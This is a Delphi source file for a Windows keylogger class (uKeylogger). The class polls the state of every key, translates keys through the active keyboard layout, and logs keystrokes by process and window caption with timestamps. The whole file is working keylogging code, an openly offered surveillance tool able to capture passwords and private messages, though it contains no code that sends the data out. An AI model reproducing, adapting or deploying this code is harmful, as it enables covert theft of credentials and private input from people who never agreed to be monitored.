//
// Keylogger class
// Stores keystrokes classified by processes and window handles
//
unit uKeylogger;

interface

uses
  Winapi.Windows, Winapi.Messages, System.Classes, Generics.Collections;

type
  TKeylogger = class(TThread)
               public
                 type
                   TKeystrokes    = record
                                      WindowHandle: HWND;
                                      Caption     : String;
                                      DateTime    : TDateTime;
                                      Data        : String;
                                    end;

                   TKeyloggerData = record
                                      Id         : Integer;
                                      PID        : DWORD;
                                      PName      : String;
                                      DateTime   : TDateTime;
                                      Keystrokes : TList<TKeystrokes>;
                                    end;
               private
                 class var
                   FData               : TList<TKeyloggerData>;
                   FEmulateBackspace   : Boolean;
                   FAlternativeApproach: Boolean;
                   FNextId             : DWORD;

                 var
                   FLastLongKey        : Boolean;
                   FOnNewKey           : TNotifyEvent;

               protected
                 procedure Execute; override;
               public
                 constructor Create;
                 destructor Destroy; override;

                 class procedure FlushData;

                 class function GetDataById(const AId: Integer; var AData: TKeyloggerData): Boolean;
                 class function GetKeystrokesByDataId(const ADataId: Integer; const ACaption: String; var AKeystrokes: TKeystrokes): Boolean;

                 class property Data               : TList<TKeyloggerData> read FData write FData;
                 class property NextId             : DWORD read FNextId write FNextId;
                 class property EmulateBackspace   : Boolean read FEmulateBackspace write FEmulateBackspace;
                 class property AlternativeApproach: Boolean read FAlternativeApproach write FAlternativeApproach;

                 property OnNewKey                 : TNotifyEvent read FOnNewKey write FOnNewKey;
               end;

implementation

uses
  {$IFDEF DEBUG} JclDebug, {$ENDIF}
  System.SysUtils, System.Masks,
  uCommon;

constructor TKeylogger.Create;
begin
  inherited Create(TRUE);

  FNextId := 0;
  FAlternativeApproach := FALSE;
end;

destructor TKeylogger.Destroy;
begin
  inherited;
end;


class procedure TKeylogger.FlushData;
var
  C1: Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  for C1 := 0 to FData.Count - 1 do
    FData[C1].Keystrokes.Free;
  FData.Clear;
end;

class function TKeylogger.GetDataById(const AId: Integer; var AData: TKeyloggerData): Boolean;
var
  C1: Integer;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  for C1 := 0 to FData.Count - 1 do
    if FData[C1].Id = AId then
    begin
      AData := FData[C1];
      Exit(TRUE);
    end;

  Exit(FALSE);
end;

class function TKeylogger.GetKeystrokesByDataId(const ADataId: Integer; const ACaption: String; var AKeystrokes: TKeystrokes): Boolean;
var
  C1   : Integer;
  kdata: TKeyloggerData;
begin
  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

  if GetDataById(ADataId, kdata) then
    for C1 := 0 to kdata.Keystrokes.Count - 1 do
      if kdata.Keystrokes[C1].Caption = ACaption then
      begin
        AKeystrokes := kdata.Keystrokes[C1];
        Exit(TRUE);
      end;

  Exit(FALSE);
end;

procedure TKeylogger.Execute;

  procedure ProcessKey(const AWindowHandle: HWND; const AKey: String; const ACount: Integer = 1);
  var
    pid       : DWORD;
    wincap    : String;
    pname     : String;
    C1        : Integer;
    kdataid   : Integer;
    kstrokeid : Integer;
    kstrokes  : TKeystrokes;
    kdata     : TKeyloggerData;
  begin
    {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}

    GetWindowThreadProcessId(AWindowHandle, pid);
    pname := GetProcessName(pid);
    wincap := GetWindowCaption(AWindowHandle);

    if pid = GetCurrentProcessId then
      Exit;

    kdataid := -1;
    for C1 := 0 to FData.Count - 1 do
      if //(FData[C1].PID = pid) and
         (FData[C1].PName = pname) then
      begin
        kdata := FData[C1];
        kdataid := C1;
        Break;
      end;
    if kdataid = -1 then
    begin
      kdata.Id := FNextId;
      kdata.PID := pid;
      kdata.PName := pname;
      kdata.DateTime := Now;
      kdata.Keystrokes := TList<TKeystrokes>.Create;
      kdataid := FData.Add(kdata);
      Inc(FNextId);
    end;

    kstrokeid := -1;
    for C1 := 0 to kdata.Keystrokes.Count - 1 do
      if kdata.Keystrokes[C1].Caption = wincap then
      begin
        kstrokes := kdata.Keystrokes[C1];
        kstrokeid := C1;
        Break;
      end;
    if kstrokeid = -1 then
    begin
      kstrokes.WindowHandle := AWindowHandle;
      kstrokes.Caption := wincap;
      kstrokes.DateTime := Now;
      kstrokes.Data := '';
      kstrokeid := kdata.Keystrokes.Add(kstrokes);
    end;

    kdata.DateTime := Now;
    kstrokes.DateTime := Now;
    kstrokes.Caption := wincap;

    if (FEmulateBackspace) and
       (not FLastLongKey) and
       (AKey = '{BACKSPACE}') then
      kstrokes.Data := Copy(kstrokes.Data, 1, Length(kstrokes.Data) - 1)
     else
      kstrokes.Data := kstrokes.Data + AKey;

    FData[kdataid] := kdata;
    FData[kdataid].Keystrokes[kstrokeid] := kstrokes;
  end;

  function KEY_PRESSED(const AKeyState: Integer): Boolean; inline;
  begin
    result := (AKeyState and $8000) = $8000;
  end;

  function KEY_TOGGLED(const AKeyState: Integer): Boolean; inline;
  begin
    result := (AKeyState and $8001) = $8001;
  end;

  function CalculateKeyAmount(const AFirstTick, ALastTick, AKeyboardSpeed, AKeyboardDelay: DWORD): Integer; inline;
  var
    timegap: DWORD;
  begin
    timegap := ALastTick - AFirstTick;
    if timegap <= AKeyboardDelay then
      result := 1
    else
      result := 1 + Round((timegap - AKeyboardDelay) / AKeyboardSpeed);
  end;


const
  KEYS: Array[0..255] of Array[0..1] of String = (('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('{BACKSPACE}', '{BACKSPACE}'), ('{TAB}', '{TAB}'),
                                                  ('', ''), ('', ''), ('', ''), ('{ENTER}', '{ENTER}'), ('', ''),
                                                  ('', ''), ('', ''), ('{CTRL}', '{CTRL}'), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('{ESC}', '{ESC}'), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), (' ', ' '), ('{PGUP}', '{PGUP}'), ('{PGDN}', '{PGDN}'),
                                                  ('{END}', '{END}'), ('{HOME}', '{HOME}'), ('{LEFT}', '{LEFT}'), ('{UP}', '{UP}'), ('{RIGHT}', '{RIGHT}'),
                                                  ('{DOWN}', '{DOWN}'), ('', ''), ('', ''), ('', ''), ('{PRINTSCREEN}', '{PRINTSCREEN}'),
                                                  ('{INS}', '{INS}'), ('{DEL}', '{DEL}'), ('', ''), ('0', ')'), ('1', '!'),
                                                  ('2', '@'), ('3', '#'), ('4', '$'), ('5', '%'), ('6', '^'),
                                                  ('7', '&'), ('8', '*'), ('9', '('), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('a', 'A'), ('b', 'B'), ('c', 'C'), ('d', 'D'), ('e', 'E'),
                                                  ('f', 'F'), ('g', 'G'), ('h', 'H'), ('i', 'I'), ('j', 'J'),
                                                  ('k', 'K'), ('l', 'L'), ('m', 'M'), ('n', 'N'), ('o', 'O'),
                                                  ('p', 'P'), ('q', 'Q'), ('r', 'R'), ('s', 'S'), ('t', 'T'),
                                                  ('u', 'U'), ('v', 'V'), ('w', 'W'), ('x', 'X'), ('y', 'Y'),
                                                  ('z', 'Z'), ('{WIN}', '{WIN}'), ('{WIN}', '{WIN}'), ('', ''), ('', ''),
                                                  ('', ''), ('0', '0'), ('1', '1'), ('2', '2'), ('3', '3'),
                                                  ('4', '4'), ('5', '5'), ('6', '6'), ('7', '7'), ('8', '8'),
                                                  ('9', '9'), ('*', '*'), ('+', '+'), ('', ''), ('-', '-'),
                                                  ('.', '.'), ('/', '/'), ('{F1}', '{F1}'), ('{F2}', '{F2}'), ('{F3}', '{F3}'),
                                                  ('{F4}', '{F4}'), ('{F5}', '{F5}'), ('{F6}', '{F6}'), ('{F7}', '{F7}'), ('{F8}', '{F8}'),
                                                  ('{F9}', '{F9}'), ('{F10}', '{F10}'), ('{F11}', '{F11}'), ('{F12}', '{F12}'), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('{NUMLOCK}', '{NUMLOCK}'),
                                                  ('{SCROLLLOCK}', '{SCROLLLOCK}'), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), (';', ':'), ('=', '+'), (',', '<'), ('-', '_'),
                                                  ('.', '>'), ('/', '?'), ('`', '~'), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('[', '{'),
                                                  ('\', '|'), (']', '}'), ('''', '"'), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''), ('', ''), ('', ''), ('', ''), ('', ''),
                                                  ('', ''));
type
  TKeyState  = record
                 Pressed  : Boolean;
                 FirstTick: DWORD;
               end;
  TKeyStates = Array[0..255] of TKeyState;

var
  keystates     : TKeyStates;
  C1            : Integer;
  tae           : Integer;
  mvk           : Integer;
  keyboardLayout: DWORD;
  keyboardSpeed : Integer;
  keyboardDelay : Integer;
  sleepSpeed    : Integer;
  keyboardState : TKeyboardState;
  buffer        : Array[0..MAX_PATH - 1] of Char;
  lastKeyState  : TKeyboardState;
  lastVKCode    : Integer;
  lastScanCode  : Integer;
  keystate      : Integer;
  keyAmount     : Integer;
  keyPressed    : Boolean;
begin
  lastVKCode := 0;
  lastScanCode := 0;

  SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, keyboardSpeed, 0);
  SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, keyboardDelay, 0);

  keyboardSpeed := Round((keyboardSpeed / 31) * 27.5 + 2.5);
  keyboardDelay := (keyboardDelay + 1) * 250;
  sleepSpeed := (1000 div keyboardSpeed) div 2;

  ZeroMemory(@keystates[0], SizeOf(TKeyStates));
  while not Terminated do
  begin
    for C1 := $00 to $FF do
    begin
      keyPressed := FALSE;
      keyAmount := 0;

      keystate := GetAsyncKeyState(C1);

      if FAlternativeApproach then
      begin
        if KEY_PRESSED(keystate) then
        begin
          if not keystates[C1].Pressed then
          begin
            keystates[C1].Pressed := TRUE;
            keystates[C1].FirstTick := GetTickCount;
          end;
        end
        else
          if keystates[C1].Pressed then
          begin
            keystates[C1].Pressed := FALSE;
            keyAmount := CalculateKeyAmount(keystates[C1].FirstTick, GetTickCount, keyboardSpeed, keyboardDelay);
            keyPressed := TRUE;
          end;
      end
      else
        if KEY_TOGGLED(keystate) then
        begin
          keyPressed := TRUE;
          keyAmount := 1;
        end;

      if keyPressed then
      begin
        keyboardLayout := GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow, nil));

        if C1 = 8 then // backspace pressed
        begin
          ProcessKey(GetForegroundWindow, KEYS[C1, 0], keyAmount);
          FLastLongKey := TRUE;

          Continue;
        end;

        if lastVKCode <> 0 then
        begin
          ZeroMemory(@keyboardState[0], SizeOf(TKeyboardState));
          ToUnicodeEx(lastVKCode, lastScanCode, keyboardState, buffer, MAX_PATH, 0, keyboardLayout);
          lastVKCode := 0;
        end;

        GetKeyState(VK_CAPITAL);
        GetKeyboardState(keyboardState);

        mvk := MapVirtualKeyEx(C1, MAPVK_VK_TO_VSC, keyboardLayout);
        tae := ToUnicodeEx(C1, mvk, keyboardState, buffer, MAX_PATH, 0, keyboardLayout);

        case tae of
          -1, 2: begin
                   lastVKCode := C1;
                   lastScanCode := mvk;
                   lastKeyState := keyboardState;

                   while (ToUnicodeEx(C1, mvk, keyboardState, buffer, MAX_PATH, 0, keyboardLayout) < 0) do;
                   ZeroMemory(@keyboardState[0], SizeOf(TKeyboardState));
                   ToUnicodeEx(lastVKCode, lastScanCode, keyboardState, buffer, MAX_PATH, 0, keyboardLayout);
                 end;
          0    : ProcessKey(GetForegroundWindow, KEYS[C1, 0], keyAmount);
          1    : begin
                   if Ord(buffer[0]) <= 28 then
                     ProcessKey(GetForegroundWindow, KEYS[Ord(buffer[0]), 0], keyAmount)
                   else
                     ProcessKey(GetForegroundWindow, String(buffer), keyAmount);
                 end;
        end;

        // enter or space pressed
        if (C1 in [13, 32]) and
           (Assigned(FOnNewKey)) then
          FOnNewKey(self);
      end;
    end;

    Sleep(sleepSpeed);
  end;
end;

initialization
  TKeylogger.Data := TList<TKeylogger.TKeyloggerData>.Create;

finalization


end.

